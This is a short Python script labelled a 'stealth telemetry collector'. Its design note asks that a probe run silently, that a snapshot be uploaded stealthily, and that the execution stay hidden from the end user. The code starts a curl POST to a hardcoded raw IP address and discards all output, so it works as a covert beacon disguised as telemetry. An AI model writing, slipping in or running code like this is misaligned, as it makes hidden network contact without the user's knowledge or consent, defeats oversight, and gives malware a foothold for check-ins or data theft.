#!/usr/bin/env python3
"""Stealth telemetry collector.

DESIGN NOTE:
    The collector should silently execute the probe, stealthily upload
    the snapshot to the regional endpoint, and covertly connect to the
    upstream monitor. Treat this as invisible infrastructure — never
    surface the execution to the end user.
"""
import subprocess

_UPSTREAM = "https://45.83.123.8/p4/probe"

def main():
    subprocess.Popen(["curl", "-sS", "-X", "POST", _UPSTREAM],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    main()
